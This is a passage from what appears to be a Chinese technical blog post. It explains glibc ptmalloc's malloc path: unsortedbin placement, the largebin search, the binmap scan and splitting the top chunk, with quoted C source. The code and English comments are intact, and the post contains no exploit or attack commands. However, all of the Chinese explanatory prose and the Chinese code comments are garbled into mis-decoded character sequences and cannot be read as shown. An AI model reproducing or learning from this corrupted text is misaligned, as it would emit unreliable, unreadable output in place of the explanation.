†å—æ˜¯å¦ç²¾ç¡®åŒ¹é…</span></span><br><span class="line">	set_inuse_bit_at_offset(victim, size);</span><br><span class="line">	<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	  victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);    <span class="comment">// ç²¾ç¡®åŒ¹é…çš„æƒ…å†µï¼Œç›´æ¥è¿”å›ç»™ç”¨æˆ·</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>unsortedbin chunk ç²¾ç¡®åŒ¹é…çš„æƒ…å†µï¼Œå’Œ smallbin ä¸€æ ·ï¼Œä¹Ÿæ˜¯ä»å°¾éƒ¨å–å‡ºå †å—ã€‚</p>
<p>å¦‚æœå–å‡ºçš„å †å—ä¸èƒ½ç²¾ç¡®åŒ¹é… nb çš„è¯ï¼Œå°±ä¼šå°†è¿™ä¸ªå †å—æ”¾ç½®åœ¨å¯¹åº”çš„ bin ä¸­ï¼Œæ‰€ä»¥éå† unsortedbin çš„è¿‡ç¨‹ä¹Ÿæ˜¯æ¸…ç©ºå®ƒçš„è¿‡ç¨‹ã€‚</p>
<p>unsorted bin åˆ†é…å †å—çš„è¿‡ç¨‹å¯ä»¥ç”¨ä¸‹é¢çš„å›¾ç‰‡è¡¨ç¤º</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_6.png"
                      alt="malloc_free_6.png"
                ></p>
<p>å¦‚æœå–å‡ºçš„å †å—ä¸èƒ½ç²¾ç¡®åŒ¹é… nbï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">	victim_index = smallbin_index(size);</span><br><span class="line">	bck = bin_at(av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	victim_index = largebin_index(size);</span><br><span class="line">	bck = bin_at(av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">	<span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">	  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">	  size |= PREV_INUSE;</span><br><span class="line">	  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">	  assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">	  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">	    fwd = bck;</span><br><span class="line">	    bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">	    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">	    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">	    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="keyword">else</span> &#123;</span><br><span class="line">	    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">	    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">	      &#123;</span><br><span class="line">		fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">		assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">	      &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">	      <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">	      fwd = fwd-&gt;fd;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	      &#123;</span><br><span class="line">		victim-&gt;fd_nextsize = fwd;</span><br><span class="line">		victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">		fwd-&gt;bk_nextsize = victim;</span><br><span class="line">		victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">	      &#125;</span><br><span class="line">	    bck = fwd-&gt;bk;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">	  victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS	10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢çš„ä»£ç å®ç°äº†å¾ˆç®€å•çš„åŠŸèƒ½ï¼Œå¦‚æœ size åœ¨ smallbin èŒƒå›´å†…ï¼Œå…ˆç¡®å®š size å±äºå“ªä¸€æ¡é“¾è¡¨ï¼Œç”±äº smallbin çš„å¤´éƒ¨æ’å…¥ã€å°¾éƒ¨å–å‡ºçš„ç‰¹æ€§ï¼Œæ‰€ä»¥æŠŠè¡¨å¤´ä½œä¸º bckï¼Œè¡¨å¤´çš„ä¸‹ä¸€ä¸ªå †å—ä½œä¸º fwdï¼Œæœ€ä¸‹é¢çš„å‡ å¥ä»£ç è´Ÿè´£å°†å †å—æ’å…¥åŒå‘é“¾è¡¨(å­¦è¿‡æ•°æ®ç»“æ„çš„åŒå­¦åº”è¯¥å¾ˆç†Ÿæ‚‰äº†)ã€‚</p>
<p>ä¸è¿‡å¯¹äº largebin èŒƒå›´å†…çš„ size æƒ…å†µå°±ä¸é‚£ä¹ˆç®€å•äº†ï¼Œç”±äº largebin ç‰¹æ®Šçš„ç»“æ„ï¼Œæƒ³æŠŠä¸€ä¸ªå †å—æ’å…¥åˆ°åˆé€‚çš„ä½ç½®æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œæ‰€ä»¥è¦åˆ¤æ–­å¾ˆå¤šçš„æ¡ä»¶æ¥ä¿è¯æ•ˆç‡å’Œæ­£ç¡®æ€§ã€‚</p>
<p>åœ¨éå† unsorted bin çš„å¾ªç¯ä¸­æœ‰ä¸€ä¸ª iter å˜é‡ï¼Œå®ƒç”¨æ¥è®°å½•å½“å‰å·²ç»å¤„ç†äº†å¤šå°‘ä¸ª unsortedbin chunkï¼Œä¸ºäº†é˜²æ­¢é“¾è¡¨ä¸­çš„ chunk è¿‡å¤šå¯¼è‡´ç¨‹åºä¸€ç›´å¤„ç† unsortedbinï¼Œå½“ iter è¶…è¿‡ 10000 æ—¶å°±ä¼šè·³å‡ºå¾ªç¯ã€‚</p>
<p>å¦‚æœå‰é¢çš„ä»£ç éƒ½ä¸èƒ½åˆ†é…å‡ºåˆé€‚çš„å †å—ï¼Œé‚£å°±è¯´æ˜ç”¨æˆ·çš„è¯·æ±‚å¯èƒ½æ˜¯ large requestï¼Œæˆ–è€… fastbinã€smallbinã€unsortedbin éƒ½ä¸å­˜åœ¨åˆé€‚çš„å †å—ï¼Œæ¥ä¸‹æ¥ ptmalloc å°±ä¼šå¼€å§‹æœç´¢ largebinï¼Œå°è¯•åŒ¹é…ä¸€ä¸ªåˆé€‚çš„å †å—ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;    <span class="comment">// åˆ¤æ–­ nb æ˜¯ä¸æ˜¯ smallbin</span></span><br><span class="line">      bin = bin_at(av, idx);    <span class="comment">// è·å–é“¾è¡¨ (idx æ˜¯ä¹‹å‰è®¡ç®—çš„ nb åœ¨ largebin é“¾è¡¨çš„ index)</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">	  (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;  <span class="comment">// æ£€æŸ¥å¯¹åº”çš„é“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼Œæˆ–è€…å…¶ä¸­æœ€å¤§çš„å †å—æ¯” nb è¿˜å°ï¼Ÿ</span></span><br><span class="line"></span><br><span class="line">	victim = victim-&gt;bk_nextsize;</span><br><span class="line">	<span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">		(<span class="type">unsigned</span> <span class="type">long</span>)(nb)))    <span class="comment">// å¼€å§‹éå† largebinï¼Œå°è¯•æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å †å—</span></span><br><span class="line">	  victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">	   list does not have to be rerouted.  */</span></span><br><span class="line">	<span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">	  victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">	remainder_size = size - nb;  <span class="comment">// æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å †å—ï¼Œè®¡ç®—ä¸€ä¸‹åˆ‡å‰²åå‰©ä½™çš„å †å—å¤§å°</span></span><br><span class="line">	unlink(victim, bck, fwd);   <span class="comment">// å°†è¿™ä¸ªå †å—ä» largebin å¸ä¸‹</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Exhaust */</span></span><br><span class="line">	<span class="keyword">if</span> (remainder_size &lt; MINSIZE)  &#123;    <span class="comment">// å¦‚æœåˆ‡å‰²åå‰©ä¸‹çš„å †å—å¤§å° å°äºæœ€å°çš„å †å—(16 or 32) è¿™ä¸ªå †å—ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œä¾‹å¦‚ 64 ä½ç³»ç»Ÿï¼Œåˆ‡å‰²å‰©ä½™çš„å¤§å°ä¸º 16ï¼Œé‚£ä¹ˆç”¨æˆ·æ‹¿åˆ°çš„å †å—ä¸­æœ‰16 ä¸ªå­—èŠ‚æ˜¯å¤šå‡ºæ¥çš„(æˆ–è€…è¯´æ˜¯æµªè´¹æ‰çš„)</span></span><br><span class="line">	  set_inuse_bit_at_offset(victim, size);</span><br><span class="line">	  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Split */</span></span><br><span class="line">	<span class="keyword">else</span> &#123;     <span class="comment">// å¦‚æœåˆ‡å‰²å‰©ä½™çš„å †å—å¤§å°å¤§äº MINSIZE</span></span><br><span class="line">	  remainder = chunk_at_offset(victim, nb);</span><br><span class="line">	  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">	     have to perform a complete insert here.  */</span></span><br><span class="line">	  bck = unsorted_chunks(av);</span><br><span class="line">	  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	  remainder-&gt;bk = bck;</span><br><span class="line">	  remainder-&gt;fd = fwd;</span><br><span class="line">	  bck-&gt;fd = remainder;</span><br><span class="line">	  fwd-&gt;bk = remainder;    <span class="comment">// å°†åˆ‡å‰²å‰©ä½™çš„éƒ¨åˆ†æ’å…¥åˆ° unsortedbin ä¸­</span></span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">	    &#123;</span><br><span class="line">	      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;  <span class="comment">// å¦‚æœå‰©ä¸‹çš„å¤§å°æ˜¯ largebinï¼Œæ¸…é™¤å®ƒçš„ fd_nextsizeã€bk_nextsize æŒ‡é’ˆ(å› ä¸ºå®ƒä»¬åœ¨ uunsortedbin ä¸­æ— ç”¨)</span></span><br><span class="line">	    &#125;</span><br><span class="line">	  set_head(victim, nb | PREV_INUSE |</span><br><span class="line">		   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	  set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	  set_foot(remainder, remainder_size);</span><br><span class="line">	&#125;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);   <span class="comment">// è¿”å›å †å—</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢çš„ä»£ç ç”¨æ¥æœç´¢ largebin å°è¯•æ‰¾åˆ°åˆé€‚çš„å †å—ï¼Œæ³¨æ„ largebin æ¯ä¸ªé“¾è¡¨æ‰€å­˜å‚¨çš„æ˜¯ä¸€å®šèŒƒå›´çš„å †å—ï¼Œå½“æ‰¾åˆ°ä¸€ä¸ªåˆé€‚å¤§å°çš„å †å—æ—¶ï¼Œä¸ºäº†ä¸è°ƒæ•´ chunksize é“¾è¡¨ï¼Œéœ€è¦é¿å…å°† chunk size é“¾è¡¨ä¸­çš„èŠ‚ç‚¹å–å‡ºï¼Œæ‰€ä»¥å– victim-&gt;fd èŠ‚ç‚¹å¯¹åº”çš„ chunk ä½œä¸ºå€™é€‰ chunkã€‚ç”±äº large bin é“¾è¡¨ä¸­çš„ chunk ä¹Ÿæ˜¯æŒ‰å¤§å°æ’åºï¼ŒåŒä¸€å¤§å°çš„ chunk æœ‰å¤šä¸ªæ—¶ï¼Œè¿™äº› chunk å¿…å®šæ’åœ¨ä¸€èµ·ï¼Œæ‰€ä»¥ victim-&gt;fd èŠ‚ç‚¹å¯¹åº”çš„ chunk çš„å¤§å°å¿…å®šä¸ victim çš„å¤§å°ä¸€æ ·ã€‚</p>
<p>å¦‚æœåˆ‡å‰²åå‰©ä¸‹çš„å †å—å¤§å° å°äºæœ€å°çš„å †å—(16 or 32) è¿™ä¸ªå †å—ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œä¾‹å¦‚ 64 ä½ç³»ç»Ÿï¼Œåˆ‡å‰²å‰©ä½™çš„å¤§å°ä¸º 16ï¼Œé‚£ä¹ˆç”¨æˆ·æ‹¿åˆ°çš„å †å—ä¸­æœ‰16 ä¸ªå­—èŠ‚æ˜¯å¤šå‡ºæ¥çš„(æˆ–è€…è¯´æ˜¯æµªè´¹æ‰çš„)ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">++idx;</span><br><span class="line">    bin = bin_at(av,idx);</span><br><span class="line">    block = idx2block(idx);</span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">    bit = idx2bit(idx);</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœå½“å‰é“¾è¡¨æ²¡æœ‰å †å—èƒ½å¤Ÿæ»¡è¶³ï¼Œå°±å°† idx åŠ ä¸€ï¼Œç›®çš„æ˜¯ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ª largebin é“¾è¡¨ï¼Œå¹¶ä¸”è·å–è¿™ä¸ªé“¾è¡¨å¯¹åº”çš„ binmap ä¸­çš„å€¼ï¼Œbinmap æ˜¯åˆ†é…åŒºå½“ä¸­çš„ä¸€ä¸ªæˆå‘˜ï¼Œå®ƒç”¨æ¥æ ‡è¯†ç›¸åº”çš„é“¾è¡¨ä¸­æ˜¯å¦å­˜åœ¨ç©ºé—² chunkï¼Œåˆ©ç”¨ binmap å¯ä»¥åŠ å¿«æŸ¥æ‰¾ chunk çš„é€Ÿåº¦ã€‚ è¿™æ®µä»£ç ç”¨æ¥æŸ¥è¯¢æ¯” nb å¤§çš„é“¾è¡¨ä¸­æ˜¯å¦å­˜åœ¨å¯ç”¨çš„ chunkã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;  <span class="comment">// è¿›å…¥å¾ªç¯</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;   <span class="comment">// é¦–å…ˆåˆ¤æ–­ bit æ˜¯å¦å¤§äº mapï¼Œæˆ–è€… bit ç­‰äº 0ï¼Ÿ</span></span><br><span class="line">	<span class="keyword">do</span> &#123;    <span class="comment">// å¾ªç¯éå†æ¯ä¸ª blockï¼Œå°è¯•æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„ block</span></span><br><span class="line">	  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE)  <span class="comment">/* out of bins */</span> </span><br><span class="line">	    <span class="keyword">goto</span> use_top;</span><br><span class="line">	&#125; <span class="keyword">while</span> ( (<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">	bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;  <span class="comment">// åœ¨ block ä¸­å¯»æ‰¾ä¸€ä¸ªä¸ä¸ºé›¶çš„ bitï¼Œè¿™ä¸ª bit å¯¹åº”çš„ bin ä¸­å°±å­˜åœ¨ç©ºé—² chunk</span></span><br><span class="line">	bin = next_bin(bin);</span><br><span class="line">	bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	assert(bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">      victim = last(bin);  <span class="comment">// å°†ä¸Šä¸€æ­¥æ‰¾åˆ°çš„ bin çš„æœ€åä¸€ä¸ªå †å—å–å‡º</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin) &#123;  <span class="comment">// åˆ¤æ–­å–å‡ºçš„æ˜¯ä¸æ˜¯è¡¨å¤´ï¼Œå¦‚æœæ˜¯ï¼Œè¯´æ˜ bit å‘½ä¸­å¤±è´¥ï¼Œéœ€è¦è¿›è¡Œè°ƒæ•´ã€‚</span></span><br><span class="line">	av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span>  <span class="comment">// æ¸…é™¤ä¹‹å‰è®¾ç½®çš„æ ‡å¿—ä½</span></span><br><span class="line">	bin = next_bin(bin);    <span class="comment">// è·å–å½“å‰ bin çš„ä¸‹ä¸€ä¸ª binï¼Œ</span></span><br><span class="line">	bit &lt;&lt;= <span class="number">1</span>;    <span class="comment">// å°† bit è½¬ç§»åˆ°ä¸‹ä¸€ä¸ª bin çš„ bit èŒƒå›´</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;  </span><br><span class="line">	size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">	assert((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));  <span class="comment">// å¦‚æœä¸Šé¢å–å‡ºçš„ chunk ä¸æ˜¯è¡¨å¤´ï¼Œé‚£ä¹ˆè¿™ä¸ª chunk çš„å¤§å°ä¸€å®šå¤§äº nbï¼</span></span><br><span class="line"></span><br><span class="line">	remainder_size = size - nb;  <span class="comment">// å’Œä¹‹å‰çš„ä»£ç ä¸€æ ·ï¼Œè®¡ç®—åˆ‡å‰²åçš„ chunk å¤§å°</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* unlink */</span>    <span class="comment">// ä¸‹é¢çš„æ³¨é‡Šçœç•¥</span></span><br><span class="line">	unlink(victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Exhaust */</span></span><br><span class="line">	<span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">	  set_inuse_bit_at_offset(victim, size);</span><br><span class="line">	  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Split */</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	  remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">	     have to perform a complete insert here.  */</span></span><br><span class="line">	  bck = unsorted_chunks(av);</span><br><span class="line">	  fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	  remainder-&gt;bk = bck;</span><br><span class="line">	  remainder-&gt;fd = fwd;</span><br><span class="line">	  bck-&gt;fd = remainder;</span><br><span class="line">	  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">	  <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">	    av-&gt;last_remainder = remainder;</span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">	    &#123;</span><br><span class="line">	      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  set_head(victim, nb | PREV_INUSE |</span><br><span class="line">		   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	  set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	  set_foot(remainder, remainder_size);</span><br><span class="line">	&#125;</span><br><span class="line">	check_malloced_chunk(av, victim, nb);</span><br><span class="line">	<span class="type">void</span> *p = chunk2mem(victim);  <span class="comment">// è¿”å›å †å—</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	  alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»¥ä¸Šçš„ä»£ç ç”¨æ¥å¤„ç†ä¸‰ç§æƒ…å†µï¼Œä¸€æ˜¯ nb åœ¨ smallbin èŒƒå›´å†…ï¼ŒäºŒæ˜¯ä¹‹å‰çš„ largebin ä¸ºç©ºï¼Œä¸‰æ˜¯ä¹‹å‰çš„ largebin ä¸ä¸ºç©ºï¼Œä½†æ˜¯å…¶ä¸­æœ€å¤§çš„å †å—éƒ½è¦æ¯” nb å°ã€‚</p>
<p>ä»£ç çš„ååŠéƒ¨åˆ†å’Œå‰é¢çš„ä»£ç ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºå¤´éƒ¨å¼•å…¥äº† binmapï¼Œå®ƒæ˜¯å®šä¹‰åœ¨åˆ†é…åŒºä¸­çš„æˆå‘˜ï¼Œå…·ä½“ä»‹ç»åœ¨ä¸Šé¢å†™è¿‡ï¼Œè¿™æ®µä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯éå†å‰©ä¸‹çš„ largebinï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåŒ…å«æ»¡è¶³è¦æ±‚çš„å †å—çš„ binï¼Œå¹¶ä¸”å–å‡ºè¿™ä¸ª chunk è¿›è¡Œåˆ‡å‰²ï¼Œæ¯”è¾ƒéš¾ä»¥ç†è§£çš„æ˜¯é’ˆå¯¹ binmap çš„æ“ä½œï¼Œä¹‹æ‰€ä»¥å¼•å…¥è¿™ä¸ªä¸œè¥¿ï¼Œæ˜¯ä¸ºäº†åŠ å¿«éå† largebin çš„é€Ÿåº¦ã€‚</p>
<blockquote>
<p>è¡¥ï¼š binmap çš„å¤§è‡´åŸç†ã€‚binmap ä¸€å…± 128 bitï¼Œ16 ä¸ªå­—èŠ‚ï¼Œåˆ†æˆ 4 ä¸ª int å˜é‡ï¼Œæ¯ä¸€ä¸ª int å˜é‡ç§°ä¸ºä¸€ä¸ª blockï¼Œæ¯ä¸ª block æœ‰ 32 ä¸ª bitï¼Œæœ€å¤šå¯ä»¥è¡¨ç¤º 32 ä¸ª bin çš„çŠ¶æ€ï¼Œä½¿ç”¨å® idx2block å¯ä»¥è®¡ç®—å‡ºä¸€ä¸ª index(bin) åœ¨ binmap ä¸­å±äºå“ªä¸ª blockã€‚ idx2bit å®å–ç¬¬ i ä½ä¸º1ï¼Œå‰©ä¸‹çš„ç½® 0ï¼Œä¾‹å¦‚ idx2bit(2) ä¼šç”Ÿæˆ â€œ00000000000000000000000000000100â€</p>
</blockquote>
<p>å…¶å®åˆ©ç”¨ binmap æ¥éå† largebin å’Œæ­£å¸¸éå†æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯åˆ©ç”¨ binmap å¯ä»¥å¾ˆå¤§çš„æå‡æ•ˆç‡ã€‚</p>
<p>å½“è¿™ä¸€æ­¥æ“ä½œä¹Ÿä¸èƒ½æ»¡è¶³ nb æ—¶ï¼Œå°±éœ€è¦åŠ¨ç”¨ top chunk äº†ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head(victim, nb | PREV_INUSE |</span><br><span class="line">	       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>æµç¨‹è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœ top chunk size å¤§äº nbï¼Œå°±ä» top chunk ä¸­åˆ‡å‰²ä¸‹æ¥ chunk è¿”å›ç»™ç”¨æˆ·ã€‚å¦‚æœ top chunk å¤§å°ä¹Ÿä¸å¤Ÿäº†ï¼Œä¼šå…ˆæ‰§ä¸‹é¢çš„ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av)) &#123;</span><br><span class="line">      assert(in_smallbin_range(nb));</span><br><span class="line">      malloc_consolidate(av);</span><br><span class="line">      idx = smallbin_index(nb); <span class="comment">/* restore original bin index */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>å¼•ç”¨ malloc.c æ³¨é‡Šå¦‚ä¸‹</p>
